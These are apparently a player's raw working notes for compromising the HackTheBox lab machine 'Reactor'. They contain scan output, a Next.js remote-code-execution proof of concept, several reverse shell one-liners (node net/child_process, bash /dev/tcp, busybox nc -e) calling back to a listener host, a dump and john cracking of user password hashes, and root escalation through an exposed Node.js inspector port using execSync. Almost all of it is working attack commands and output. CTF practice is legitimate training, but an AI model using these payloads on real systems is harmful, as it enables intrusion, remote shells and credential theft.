not able to mopen the site at 3000 port

```
─$ nmap -Pn -sC 10.129.18.51
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-05 13:42 EDT
Nmap scan report for 10.129.18.51
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds

```

```
─$ curl -I http://10.129.18.51:3000  
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, 
ETag: "p02u6gnhufd8t"
Content-Type: text/html; charset=utf-8
Content-Length: 17175
Date: Fri, 05 Jun 2026 17:45:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5

```

```
$ python poc.py
500
0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}

```

```
python3 poc.py http://10.129.18.51:3000 "node -e 'const c=require(\"child_process\"),n=require(\"net\"),s=n.connect(4444,\"10.10.15.10\");s.pipe(c.spawn(\"/bin/sh\").stdin);s.pipe(s.writable?s:s.stdout);'"

```

python3 poc.py http://10.129.18.51:3000 "sh -i >& /dev/tcp/10.10.15.10/4444 0>&1"

python3 poc.py http://10.129.18.51:3000 "find / -name "user.txt" 2>/dev/null"

## another htb walkaround

https://www.ashirrana.app/article/reactor-hackthebox-writeup

nc -lvnp 4444

python3 nextjs_exploit.py http://10.129.74.23:3000 "busybox nc 10.10.14.137 4444 -e /bin/sh"


```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.137] from (UNKNOWN) [10.129.74.23] 49388
ls
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt.gz hashes.txt

reactor1 - password

ssh engineer@10.129.74.23

/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

node inspect 127.0.0.1:9229

exec("process.getuid()")

exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")

exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")

 engineer@reactor:~$ node inspect 127.0.0.1:9229connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
'41eded25de9ce1b5fe138e61f1635cd2\n'
m